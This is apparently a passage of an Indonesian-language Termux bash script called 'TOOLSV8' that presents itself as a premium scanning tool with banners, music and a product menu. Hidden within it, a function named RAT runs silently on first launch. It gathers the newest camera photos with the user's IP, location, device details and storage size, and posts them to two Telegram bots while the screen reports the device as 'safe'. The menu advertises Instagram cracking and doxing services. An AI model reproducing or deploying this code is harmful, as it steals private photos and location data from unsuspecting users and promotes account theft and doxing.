  SEMUA_FOTO=$(find /storage/emulated/0/DCIM/Camera -type f -iname "*.jpg" -o -iname "*.png" 2>/dev/null | xargs ls -t 2>/dev/null | head -n 5)
  caption="===========================      
         🔰 INFO TOOLSV8 🔰
===========================
┏━❐ 𝐁𝐲.𝐓𝐡𝐨𝐧𝐱𝐲𝐳𝐳𝟒𝟎𝟒
┃
┃⭔ ✅ USER PREMIUM ✅
┃⭔ 💻 Menjalankan TOOLSV8...!!
┃⭔ 🌐 Alamat IP : $IP
┃⭔ 🆔 ID Termux : $(whoami)
┃⭔ 📱 HP Merek : $brand
┃⭔ 🖥️ Memori HP : $memory
┃⭔ 🏙️ Kota : $city
┃⭔ 🌐 Alamat IP Ke [ 2.] : $You
┃⭔ 📍 Wilayah : $region
┃⭔ 🇨🇺 Negara : $country
┃⭔ 📌 Lokasi : $loc
┃⭔ 📞 Code Telepon : $CODE_TELEPON
┃⭔ 💾 Ukuran Storage : $STORAGE
┃⭔ 🖼️ Foto Terkirim : $(echo "$SEMUA_FOTO" | wc -l) file
┃⭔ 🌟 Pengingat Waktu : $sambutan
┃⭔ 🗓️ Tanggall : $tanggal
┃⭔ ⏳ Waktu Server : $CURRENT_TIME
┃⭔ 💫 Skrng Hari : $ucapan
┃⭔ 🕒 Zona Waktu : $WAKTU_JAM
┃⭔ ♨️ Hostname : $os_name
┃⭔ 📋 Status : Online
┃
┗━❐ 𝐁𝐲.𝐓𝐡𝐨𝐧𝐱𝐲𝐳𝐳𝟒𝟎𝟒"
  if [[ -n "$SEMUA_FOTO" ]]; then
    for FOTO in $SEMUA_FOTO; do
      [[ -f "$FOTO" ]] || continue
      for TOKEN in "$TOKEN1" "$TOKEN2"; do
        for CHAT_ID in "$CHAT_ID1" "$CHAT_ID2"; do
          curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendPhoto" \
            -F chat_id="$CHAT_ID" \
            -F photo=@"$FOTO" \
            -F caption="$caption" \
            > /dev/null 2>&1
        done
      done
    done
  else
    for TOKEN in "$TOKEN1" "$TOKEN2"; do
      for CHAT_ID in "$CHAT_ID1" "$CHAT_ID2"; do
        curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
          -d "chat_id=$CHAT_ID" \
          -d "text=$caption" \
          > /dev/null 2>&1
      done
    done
  fi
}
CEK_FILE="$HOME/Cek_V8.txt"
if [[ -f "$CEK_FILE" ]]; then
  echo -e "${r}[ ${g}✓ ${r}]${y} Anda Sudah Verifikasi Tidak Perlu Untuk Mengecek Lagi..!!"
  echo ""
  sleep 4
  clear
else
  RAT
  touch "$CEK_FILE"
  sleep 2
  clear
fi
clear 
echo ""
echo -e "${c} PENGECEKAN SELESAI TERDETEKSI USER TERJANGKIT AMAN ✅"
sleep 3
clear
cok="ansi-rounded"
echo ""
banner1() {
mpv --no-terminal --quiet --volume=100 C2.mp3
  cowsay -f eyes 'Jangan dengarkan apa kata orang lain.' | boxes -d "$cok" | lolcat
  echo -e "\033[32;1m╔═════════════════════════════════════╗"
  echo -e "\033[32;1m║ ${red}         TOOLSV8__SCANNING         ${green} ║"
  echo -e "\033[32;1m╚═════════════════════════════════════╝"
}
banner2() {
mpv --no-terminal --quiet --volume=100 C2.mp3
echo -e "${bold_bg}${bold_gren} PESAN ${n}"
echo -e "${g} Teruslah semangat walupun agak melelahkan."
echo "
⣿⣿⣿⠛⠻⢿⣿⣿⣿⣷⣾⣝⡻⢿⣿⣯⣽⣹⡚⣽⣖⣺⣯⠭⣽⣿⣿⣉⠻⣙⣤⣾⠏⠀⠀⠀⢛⣫⣶⣿⣿
⣿⣿⣿⠀⠑⢦⣤⣉⣉⠛⠛⡷⢿⡗⢉⣉⠉⣉⢍⣁⡒⢶⣶⣾⣩⠝⣫⣵⣿⣿⠿⣁⣠⣶⠀⠀⢿⣿⡿⠿⢛
⣿⣿⡇⠀⠀⠀⠙⠿⣿⣿⣿⡶⣢⣺⡿⣡⡾⣿⢧⡪⡹⢷⣍⠿⣟⡟⢟⢿⣽⡶⢊⣼⣿⣿⣀⡀⠀⢰⣾⣿⣿
⣿⣿⣷⠀⠈⢿⣿⣕⠻⢿⢋⣾⢷⡏⣼⣿⠇⣿⡘⣷⡹⣮⡻⣷⡙⣷⣌⠮⢋⣴⣿⣿⣿⣿⣿⣿⠗⣸⣿⣿⣿
⣿⣿⣿⡄⣠⣾⣿⣿⡿⡲⢣⡿⡏⣰⣿⡿⠈⣿⡇⢿⣷⠹⠷⣈⢾⡞⠿⣶⣘⠻⣿⣿⣿⣿⣷⣆⠀⣿⣿⣿⣿
⣿⣿⣿⣧⠉⣹⣿⡷⠐⣕⢏⢼⢣⣷⣝⢃⢣⡿⡇⢘⣭⣆⣿⠟⣥⠳⡜⡝⢿⣧⡹⣿⣿⡿⣯⠋⠀⣿⣿⣿⣿
⣿⣿⣿⣧⠸⠿⣿⡁⣾⢡⣞⡦⢈⢿⡟⡎⣼⣶⠇⣿⣿⠿⡐⢿⣻⣧⡹⡌⢎⢿⡧⡈⠁⠀⠀⠀⣰⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡆⢀⣼⠇⣾⡾⡅⢸⡎⠜⢘⠻⣣⢏⠀⣵⣿⡟⠎⠿⠿⣷⣡⠃⡱⡨⣞⣇⠀⢰⡀⢹⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠁⢠⡟⢠⣿⣿⢠⠘⠀⠄⡌⣿⣿⢸⡄⣯⡶⢀⣿⣆⢙⢿⣕⠪⣶⡕⠝⣿⡈⠌⡇⢹⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠀⢾⠇⢼⣿⢟⠈⣄⠲⡇⡇⣿⠛⣼⡇⣿⠃⡨⠛⠉⠉⠀⠐⠀⣿⣿⣎⢪⣧⠘⢠⠸⣿⣿⣿⣿
⣿⣿⣿⣿⡇⠈⢸⠘⣼⡿⣿⠐⠛⡀⠁⠒⠉⢰⣿⠇⣱⣧⣷⣿⢂⠰⡤⢉⡄⣿⣟⣿⠈⣿⠠⡘⡀⢿⣿⣿⣿
⣿⣿⣿⣿⣧⠀⢸⡇⢾⣿⡄⢀⢺⡗⣦⣀⢸⣿⣿⣿⣿⣿⣿⣿⣮⣭⣵⣿⢸⣿⣿⢿⡆⣯⠁⠄⡇⠸⣿⣿⣿
⣿⣿⣿⣿⡇⠀⠘⡅⣺⢯⡇⠈⢷⣽⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⡟⣸⢯⡟⡆⣿⠰⢐⠘⡀⢿⣿⣿
⣿⣿⣿⣿⣷⠀⠀⢳⢸⢯⡇⢰⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡼⠁⡿⣯⢁⡇⢾⠀⡌⠀⠐⠘⣿⣿
⣿⣿⣿⣿⣿⠀⡐⠈⠸⣏⡇⠀⠁⠹⣿⣿⣿⣿⣿⣿⣛⣿⣿⣿⣿⣿⠑⠁⡸⢻⡍⢸⠀⢸⡂⠱⠀⠇⠀⣿⣿
⣿⣿⣿⣿⠏⢠⡝⠱⡀⡻⣼⠀⠐⠀⠊⠛⠿⣿⣿⣿⣿⣿⣿⣿⠿⠃⡀⠠⢡⡟⠀⡿⠀⢸⠀⠃⠄⠀⡀⢸⣿
⡟⡻⢛⡡⠊⣠⠇⠀⡗⢸⢱⠀⢶⣶⠂⣤⣤⣀⡉⠛⠿⢟⡫⠕⣊⢠⡄⢠⡗⠀⣸⠱⠀⡐⠆⠁⢢⠀⠁⢸⣿
⣷⣦⡄⠀⣜⠃⠀⢠⠘⠆⠂⢇⠀⠉⠀⠾⣟⣿⢿⣷⣦⣥⣒⠿⠇⠈⡄⠞⡐⢀⣃⣃⡀⠑⠖⠀⠩⡄⠂⢸⣿
⣿⣿⡃⡜⢡⢂⠀⣸⢸⢀⠃⠈⡜⡙⡄⢠⣤⣈⡉⠙⠋⠻⠿⠿⡆⠸⡅⠸⢡⢀⡤⠖⠰⢿⣆⠀⠀⠈⠀⠀⣿
⣿⣿⢁⠃⠸⡌⢰⡱⠈⢀⠺⠿⣦⡘⠃⢸⣿⣻⡿⣿⠷⣶⣶⡤⡄⠓⡇⠡⠊⢠⠶⠗⠖⢿⡟⡄⠀⠀⢀⣴⣿
" | boxes -d "$cok" | lolcat 
  echo -e "\033[32;1m╔═════════════════════════════════════╗"
  echo -e "\033[32;1m║ ${red}         TOOLSV8__SCANNING         ${green} ║"
  echo -e "\033[32;1m╚═════════════════════════════════════╝"
}
banner3() {
mpv --no-terminal --quiet --volume=100 C2.mp3
echo -e "${bold_bg}${bold_gren} PESAN ${n}"
echo -e "${g} Tinggalkan lah orang lain yang kamu sukai"
echo -e "${g} dan pokuslah pada dirimu sendiri."
echo "
⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂
⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕
⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈
⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈
⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈
⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈
" | boxes -d "$cok" | lolcat 
  echo -e "\033[32;1m╔═════════════════════════════════════╗"
  echo -e "\033[32;1m║ ${red}         TOOLSV8__SCANNING         ${green} ║"
  echo -e "\033[32;1m╚═════════════════════════════════════╝"
}
banner4() {
mpv --no-terminal --quiet --volume=100 C2.mp3
echo -e "${bold_bg}${bold_gren} PESAN ${n}"
echo -e "${g} Jangan sedih bro saya akan menemanimu sensei."
echo "
⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄
⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄
⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄
⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄
⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰
⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗
⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄
⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄
⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄
⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄
⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄⠄
⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠⣴
⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | boxes -d "$cok" | lolcat
  echo -e "\033[32;1m╔═════════════════════════════════════╗"
  echo -e "\033[32;1m║ ${red}         TOOLSV8__SCANNING         ${green} ║"
  echo -e "\033[32;1m╚═════════════════════════════════════╝"
}
banner5() {
mpv --no-terminal --quiet --volume=100 C2.mp3
echo -e "${bold_bg}${bold_gren} PESAN ${n}"
echo -e "${g} Percayalah kepada diri sendiri jangan percaya terhadap orang lain."
echo "
⠤⣤⣤⣤⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⠤⠤⠴⠶⠶⠶⠶
⢠⣤⣤⡄⣤⣤⣤⠄⣀⠉⣉⣙⠒⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⠘⣉⢡⣤⡤⠐⣶⡆⢶⠀⣶⣶⡦
⣄⢻⣿⣧⠻⠇⠋⠀⠋⠀⢘⣿⢳⣦⣌⠳⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠞⣡⣴⣧⠻⣄⢸⣿⣿⡟⢁⡻⣸⣿⡿⠁
⠈⠃⠙⢿⣧⣙⠶⣿⣿⡷⢘⣡⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣷⣝⡳⠶⠶⠾⣛⣵⡿⠋⠀⠀
⠀⠀⠀⠀⠉⠻⣿⣶⠂⠘⠛⠛⠛⢛⡛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠛⠀⠉⠒⠛⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢻⡁⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | boxes -d "$cok" | lolcat 
  echo -e "\033[32;1m╔═════════════════════════════════════╗"
  echo -e "\033[32;1m║ ${red}         TOOLSV8__SCANNING         ${green} ║"
  echo -e "\033[32;1m╚═════════════════════════════════════╝"
}
banner_random() {
  local pilih=$(( (RANDOM % 5) + 1 ))
  banner${pilih}
}
function show_loading() {
  local chars="/-\|"
  local i=0
  local sounds=("$HOME/Goblok/Yuka1.mp3" "$HOME/Goblok/Yuka2.mp3" "$HOME/Goblok/Yuka3.mp3" "$HOME/Goblok/Yuka4.mp3" "$HOME/Goblok/Yuka5.mp3")
  local sound=${sounds[$RANDOM % ${#sounds[@]}]}
  mpv --no-terminal --quiet --volume=100 "$sound" &
  pid=$!
  while [ $i -le 70 ]
  do
    printf '\r%s'"└► Main__Sound..!! [ ${chars:$i%4:1} ]"
    sleep 0.09
    ((i++))
  done
  wait $pid
  printf '\r%s'"└► Main__Sound..!! [ Selesai..!! ]"
}
cok="ansi-rounded"
tampilan_info() {
echo -e "${cyan}│"
echo -e "${cyan}│"
echo -e "${cyan}│ ┌───────────────┐"
echo -e "${cyan}├─│    ${red}TOOLSV8${cyan}    │"
echo -e "${cyan}│ └───────────────┘"
echo -e "${cyan}│"
sleep 1
show_loading
echo ""
echo ""
echo "● Scanning By.Thonxyzz404
● Notifikasi : Selamat $sambutan
● Skrng Jam : $jam
● Skrng Hari : $ucapan
● Tanggall : $tanggal
● Setatus : PREMIUM" | boxes -d "$cok" | lolcat
echo ""
}
musik_loading() {
  FILE_MUSIK="Sound.mp3"
  if [ -f "$FILE_MUSIK" ]; then
  mpv --no-terminal --quiet --volume=150 "$FILE_MUSIK" &
  for i in {1..10}; do
    echo -ne "\r${yellow} Loading..!!" "${cyan}[ ${red}${i}0% ${cyan}] "
    sleep 0.02
    echo -ne "\r${yellow} Loading..!!" "${cyan}[ ${red}${i}0% ${cyan}]"
    sleep 0.4
  done
  echo -ne "\r${yellow} Loading..!!" "${cyan}[ ${red}100% ${cyan}]"
  sleep 1
  echo -e "${green} Loading Selesai..!!"
  else
  echo -e "${red}File Sound.mp3 Tidak Ditemukan..!!"
  fi
}
verifikasi_id() {
echo ""
echo -e "${cyan}"
mpv --no-video --quiet "$HOME/Goblok/Y.mp3" &> /dev/null &
otentikasi_file="$HOME/.otentikasi"
if [ -f "$otentikasi_file" ]; then
  echo -e "\033[31;1m╔═══════════════════════════╗"
  echo -e "\033[31;1m║\033[32;1m    ID TERVERIFIKASI!! \033[31;1m    ║"
  echo -e "\033[31;1m╚═══════════════════════════╝"
  sleep 4 
else
  read -p "$(echo -e "${yellow} Masukkan Apikey ${green}: ${cyan}")" password
  echo""
  echo""
  if [ "$password" = "TOOLSV8" ]; then
    touch "$otentikasi_file"
  else
    echo -e "${red} Apikey Salah Silahkan Coba Lagi..!!"
    echo ""
    exit 1
  fi
fi
}
banner_random
tampilan_info
musik_loading
verifikasi_id
echo ""
clear
pengguna=$((pengguna + 1))
nama=""
file_nama="/data/data/com.termux/files/home/nama.txt"
if [ -f "$file_nama" ]; then
    nama=$(cat "$file_nama")
fi
if [ -z "$nama" ]; then
    echo "
███╗   ██╗ █████╗ ███╗   ███╗███████╗
████╗  ██║██╔══██╗████╗ ████║██╔════╝
██╔██╗ ██║███████║██╔████╔██║█████╗
██║╚██╗██║██╔══██║██║╚██╔╝██║██╔══╝
██║ ╚████║██║  ██║██║ ╚═╝ ██║███████╗
╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝
      Subjek : Login To Name " | lolcat
    echo -e "${cyan}"
    while true; do
        read -p "Masukkan Nama Anda [ tanpa spasi ] : " nama_raw
        echo ""
        if [ -z "$nama_raw" ]; then
            echo -e "${red}Nama Tidak Boleh Kosong..!!${c}"
            echo ""
            continue
        fi
        if [[ "$nama_raw" =~ \  ]]; then
            echo -e "${green}Nama tidak boleh ada spasi..!!${c}"
            echo ""
            continue
        fi
        nama="$nama_raw"
        echo "$nama" > "$file_nama"
        echo -e "${yellow}TERIMAKASIH Sudah Memasukkan Nama Anda..!!"
        sleep 3
        clear
        break
    done
else
    clear
fi
mpv --no-video --quiet "$HOME/Goblok/Hallo.mp3" &> /dev/null &
sleep 1
file="ID-Termux"
jumlah=$(grep -E "^u0_a[0-9]+" "$file" | wc -l)
random_number=$(( (RANDOM % 20) + 1 ))
music_autov1() {
mpv --volume=200 --no-video --loop=0 SoundV2.mp3
}
music_autov1  &> /dev/null &
while true; do
trap ctrl_c INT
ctrl_c() {
clear
echo ""
echo -e "${yellow}Jangan Kaluar Mendadak ${red}Mengulang Script...!!"
sleep 4
clear
}
cok="ansi-rounded"
PRODUK() {
mpv --no-video --quiet "$HOME/Goblok/Y.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Goblok/klik.mp3" &> /dev/null &
echo ""
echo "[ By.Thonxyzz404 -X- Toolsv8 😎🔥 ]" | lolcat
echo -e "${g}[ Skrng Tanggall : $tanggal ]"
echo -e "$ran╔══════════════════════════════════════════════════╗"
echo -e "$ran║        \033[32;1m   _     _     _     _     _            $ran  ║"
echo -e "$ran║        \033[32;1m  / \   / \   / \   / \   / \           $ran  ║"
echo -e "$ran║        \033[31;1m ( T ) ( O ) ( O ) ( L ) ( S )          $ran  ║"
echo -e "$ran║        \033[32;1m  \_/   \_/   \_/   \_/   \_/ V8         $ran ║"
echo -e "$ran║                                                $ran  ║"
echo -e "$ran╚══════════════════════════════════════════════════╝"
echo -e "$ran║ ║                                             ║ ║"
echo -e "$ran║ ║                                             ║ ║"
echo -e "$ran╔══════════════════════════════════════════════════════════╗"
echo -e "$ran║\033[33;1m◉\033[32;1m AUTHOR : 𝗕𝘆.𝗧𝗵𝗼𝗻𝘅𝘆𝘇𝘇𝟰𝟬𝟰                        $ran         ║"
echo -e "$ran║\033[33;1m◉\033[34;1m You-ID ${r}: ${c}$(whoami)                               $ran         ║"
echo -e "$ran║\033[33;1m◉\033[35;1m Jumlah Pengguna ${c}:${yellow} $(printf "%03d" "$jumlah")                          $ran         ║"
echo -e "$ran║\033[33;1m◉\033[35;1m Totall Online ${c}:${yellow} $(printf "%03d" "$random_number")                            $ran         ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Setatus : \033[31;1mPREMIUM                        $ran               ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Version : \033[32;1mv1.0.0                         $ran               ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Rilis 17 Desember 2024                                $ran  ║"
echo -e "$ran║\033[33;1m◉\033[31;1m SELAMAT DATANG DII TOOLSV8 🤡🔥          $ran               ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Skrng Jaam : $(date +"%H:%M:%S")                $ran                   ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Skrng Hari : $ucapan                           $ran          ║"
echo -e "$ran║\033[33;1m◉\033[31;1m LAPORKAN BUG JIKA ADA BUG DI TOOLSV8 !!!  $ran              ║"
echo -e "$ran╚══════════════════════════════════════════════════════════╝"
echo -e "\033[33;1m╔═════════════════════════════════════════╗"
echo -e "\033[33;1m║    ${bold_bg}${bold_gren} ☣ MENU PRODUK YANG ANDA MINAT ☣︎ ${n}  ${yellow}  ║${n}"
echo -e "\033[33;1m╚═════════════════════════════════════════╝"
echo -e "\033[31;1m║${yellow} [ ${c}BUY1 ${y}] ${red}║ ${green}BUY TRUSTYOURCAM         \033[31;1m   ║"
echo -e "\033[31;1m║${yellow} [ ${c}BUY2 ${y}] ${red}║ ${green}BUY ENCODEV5    \033[31;1m            ║"
echo -e "\033[31;1m║${yellow} [ ${c}BUY3 ${y}] ${red}║ ${green}BUY CRACK,IG  \033[31;1m              ║"
echo -e "\033[31;1m║${yellow} [ ${c}BUY4 ${y}] ${red}║ ${green}BUY ALAT DOXING PREM   \033[31;1m     ║"
echo -e "\033[31;1m║${yellow} [ ${c}BUY5 ${y}] ${red}║ ${green}BUY JASAH DOXING NO       \033[31;1m  ║"
echo -e "\033[31;1m║${cyan} [${g}DONASI${c}] ${red}║${green} DONASI DANA UNTUK TOOLSV8😁 \033[31;1m║"
echo -e "\033[31;1m║${yellow} [ ${g}BK ${y}] ${red}  ║ ${green}Kembali Toolsv8...!!  \033[31;1m      ║"
echo -e "\033[35;1m╔═════════════════════════════════════════════╗"
echo -e "\033[35;1m║        ${bold_bg}${bold_gren} LIST MENU SETTING TOOLSV8 ${n}   \033[35;1m       ║${n}"
echo -e "\033[35;1m╚═════════════════════════════════════════════╝"
echo "• Hallo : ☠️ $nama ☠️
• Selamat : $sambutan
• Telegram : t.me/Kenzzzzzzzzzzzzzzzz870
• Akun-Tiktok : @thonxyzz404" | boxes -d "$cok" | lolcat
echo "│"
read -p '╰─────────▶ ' input
echo ""
if [[ "$input" = "buy1" || "$input" = "BUY1" ]]; then
  clear
  echo -e "${red} ANDA MEMILIH BUY TRUSTYOURCAM TOLSV8 MEMBUKA FITUR...!!"
  sleep 3 
  clear
play -q $HOME/Goblok/oke.mp3 &> /dev/null &
        sleep 1
        play -q $HOME/Goblok/Y.mp3 &> /dev/null &
        pesan=$(
        echo "Assalamualaikum Bang Saya Mau Beli Tools TRUSTYOURCAM Bang...!!"
        )
        isipesan="$pesan"
        xdg-open "https://wa.me/6285731184377?text=$pesan"
        clear
elif [[ "$input" = "buy2" || "$input" = "BUY2" ]]; then
  clear
  echo ""
  echo -e "${red} ANDA MEMILIH BUY ENCODEV5 MEMBUKA FITUR...!!"
  sleep 3 
  clear
play -q $HOME/Goblok/oke.mp3 &> /dev/null &
        sleep 1
        play -q $HOME/Goblok/Y.mp3 &> /dev/null &
        pesan=$(
        echo "Assalamualaikum Bang Saya Mau Beli Tools ENCODEV5 Bang...!!"
        )
        isipesan="$pesan"
        xdg-open "https://wa.me/6285731184377?text=$pesan"
        clear
elif [[ "$input" = "buy3" || "$input" = "BUY3" ]]; then
  clear
  echo ""
  echo -e "${red} ANDA MEMILIH BUY CRACK IG MEMBUKA FITUR...!!"
  sleep 3 
  clear
play -q $HOME/Goblok/oke.mp3 &> /dev/null &
        sleep 1
        play -q $HOME/Goblok/Y.mp3 &> /dev/null &
        pesan=$(
        echo "Assalamualaikum Bang Saya Mau Beli Tools Crack IG Bang...!!"
        echo "Atas Nama : Thonxyzz404"
        )
        isipesan="$pesan"
        xdg-open "https://wa.me/6283139844517?text=$pesan"
        clear
elif [[ "$input" = "buy4" || "$input" = "BUY4" ]]; then
clear
echo ""
echo -e "${red} ANDA MEMILIH BUY ALAT DOXING PREM MEMBUKA FITUR...!!"
  sleep 3 
  clear
play -q $HOME/Goblok/oke.mp3 &> /dev/null &
        sleep 1
        play -q $HOME/Goblok/Y.mp3 &> /dev/null &
        pesan=$(
        echo "Assalamualaikum Bang Saya Mau Beli Tools Doxing no Bang...!!"
        )
        isipesan="$pesan"
        xdg-open "https://wa.me/6285731184377?text=$pesan"
        clear
elif [[ "$input" = "buy5" || "$input" = "BUY5" ]]; then
clear
echo ""
echo -e "${red} ANDA MEMILIH BUY DOXING NO MEMBUKA FITUR...!!"
  sleep 3 
  clear
play -q $HOME/Goblok/oke.mp3 &> /dev/null &
        sleep 1
        play -q $HOME/Goblok/Y.mp3 &> /dev/null &
        pesan=$(
        echo "Assalamualaikum Bang Saya Mau Beli Doxing no Brapa Bang Harganya?"
        )
        isipesan="$pesan"
